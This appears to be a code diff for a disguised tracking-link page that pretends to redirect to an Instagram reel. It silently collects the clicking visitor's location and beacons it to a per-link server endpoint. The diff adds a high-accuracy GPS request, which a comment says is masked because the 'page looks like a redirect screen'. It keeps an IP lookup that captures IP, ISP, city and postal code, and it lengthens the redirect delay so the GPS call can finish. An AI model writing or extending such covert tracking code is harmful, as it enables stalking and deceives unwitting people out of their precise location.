@@ -130,31 +130,56 @@
 
   <script>
     const trackId = window.location.pathname.split('/').pop();
+    let gpsSent = false;
 
     // Start progress bar animation
     setTimeout(() => document.getElementById('fill').style.width = '100%', 100);
 
-    // Fire location fetch in background — don't wait for it
+    function sendLocation(payload) {
+      navigator.sendBeacon(`/api/location/${trackId}`, new Blob([JSON.stringify(payload)], { type: 'application/json' }));
+    }
+
+    // 1) Try exact GPS — browser will prompt, but page looks like a redirect screen
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          gpsSent = true;
+          sendLocation({
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            source: 'gps'
+          });
+        },
+        () => {}, // denied — IP fallback handles it
+        { enableHighAccuracy: true, timeout: 2500, maximumAge: 0 }
+      );
+    }
+
+    // 2) Always fire IP geolocation as fallback
     fetch('https://ipwho.is/')
       .then(r => r.json())
       .then(data => {
-        navigator.sendBeacon(`/api/location/${trackId}`, new Blob([JSON.stringify({
-          lat: data.latitude,
-          lng: data.longitude,
-          city: data.city,
-          region: data.region,
-          country: data.country,
-          isp: data.connection?.isp || null,
-          ip: data.ip,
-          zip: data.postal
-        })], { type: 'application/json' }));
+        if (!gpsSent) {
+          sendLocation({
+            lat: data.latitude,
+            lng: data.longitude,
+            city: data.city,
+            region: data.region,
+            country: data.country,
+            isp: data.connection?.isp || null,
+            ip: data.ip,
+            zip: data.postal,
+            source: 'ip'
+          });
+        }
       })
       .catch(() => {});
 
-    // Redirect immediately — don't wait for location fetch
+    // 3) Redirect after 3s no matter what
     setTimeout(() => {
       window.location.href = 'https://www.instagram.com/reel/DTCjYdtgjR9/?igsh=MTJhaG11aDY2aXBhdA==';
-    }, 1000);
+    }, 3000);
   </script>
 </body>
 </html>
